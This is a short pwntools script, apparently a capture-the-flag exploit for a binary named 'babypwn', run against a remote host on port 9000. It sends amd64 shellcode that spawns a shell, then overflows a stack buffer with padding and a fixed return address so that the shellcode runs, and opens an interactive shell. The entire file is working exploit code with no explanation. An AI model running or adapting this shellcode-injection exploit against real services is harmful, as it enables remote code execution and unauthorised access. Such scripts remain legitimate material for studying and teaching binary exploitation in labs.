from pwn import *
context.log_level='debug'
#p=process("babypwn")
p=remote("stack.overflow.fail",9000)
#gdb.attach(p,'b *0x0000000004007A7 ')
context.arch='amd64'
payload=shellcraft.sh()
payload=asm(payload)
p.sendlineafter("name?\n",payload)
payload="+"+"0\n"+"*"*0x58+p64(0x000000000601080)
p.sendline(payload)
p.interactive()
